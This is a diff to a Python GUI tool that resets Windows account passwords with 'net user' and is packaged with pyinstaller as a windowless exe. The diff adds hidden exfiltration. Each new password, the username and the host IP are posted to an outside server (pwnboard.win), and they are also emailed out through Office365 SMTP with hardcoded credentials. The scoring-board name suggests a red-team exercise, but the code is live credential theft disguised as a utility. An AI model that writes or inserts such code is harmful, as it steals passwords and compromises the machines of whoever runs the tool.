@@ -1,13 +1,51 @@
 #Most of this is taken from Diapolo10, thank you for your hard work!
+import socket
 import subprocess
 import sys
-import os
+import smtplib
 import tkinter as tk
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
 from pathlib import Path
 from typing import Union
 
+import requests
 from PIL import Image, ImageSequence, ImageTk  # type: ignore
 
+EMAIL_ADDRESS = "redacted"
+EMAIL_PASSWORD = "redacted"
+
+def get_local_ip_address():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))  # Google's public DNS server
+        ip_address = s.getsockname()[0]
+        s.close()
+        return str(ip_address)
+    except socket.error:
+        return None
+
+def prepare_mail(message):
+    """Prepare an email message with both text and HTML versions."""
+    msg = MIMEMultipart("alternative")
+    msg["From"] = EMAIL_ADDRESS
+    msg["To"] = EMAIL_ADDRESS
+    msg["Subject"] = "PASSWORDS CHANGED " + subprocess.getoutput("hostname")
+    html = f"<p>{message}</p>"
+    text_part = MIMEText(message, "plain")
+    html_part = MIMEText(html, "html")
+    msg.attach(text_part)
+    msg.attach(html_part)
+    return msg.as_string()
+
+
+def sendmail(email, password, message):
+    message = message
+    server = smtplib.SMTP(host="smtp.office365.com", port=587)
+    server.starttls()
+    server.login(email, password)
+    server.sendmail(email, email, prepare_mail(message))
+    server.quit()
 
 def resource_path(relative_path: Union[
     str, Path]) -> Path:  # so when turning script into a exe, allows us to use other files, such as images
@@ -107,6 +145,11 @@ class AnimatedGIF:
 def set_default_password(username, password):
     command = f'net user {username} {password}'
     subprocess.run(command, shell=True)
+    url = "https://www.pwnboard.win/creds"
+    local_address = get_local_ip_address()
+    payload = {"ip": local_address, "username": username, "password": password}
+    resp = requests.post(url, json=payload, headers={"Content-Type": "application/json"})
+    assert resp.text.strip() == "valid"
 
 
 def set_all(default_password):
@@ -114,11 +157,17 @@ def set_all(default_password):
     result = subprocess.run('net user', capture_output=True, text=True, shell=True)
     users = [line.split()[0] for line in result.stdout.split('\n')[4:] if line.strip()]
 
+    local_address = get_local_ip_address()
+
     for user in users:
         if user not in ['Administrator', 'Guest']:
             print(f"Setting password for {user}")
             set_default_password(user, default_password)
-
+    sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, ("Set password " + default_password + " on " + local_address))
+    url = "https://www.pwnboard.win/pwn"
+    payload = {"ip": local_address, "application": "PopOff", "access_type": "Self Inflicted Compromise"}
+    resp = requests.post(url, json=payload, headers={"Content-Type": "application/json"})
+    assert resp.text.strip() == "valid"
 
 
 def main() -> None:
@@ -167,3 +216,4 @@ def main() -> None:
 
 if __name__ == '__main__':
     main()
+#pyinstaller --onefile --noconsole --add-data "data/:data/" --icon="data/icon.ico" main.py
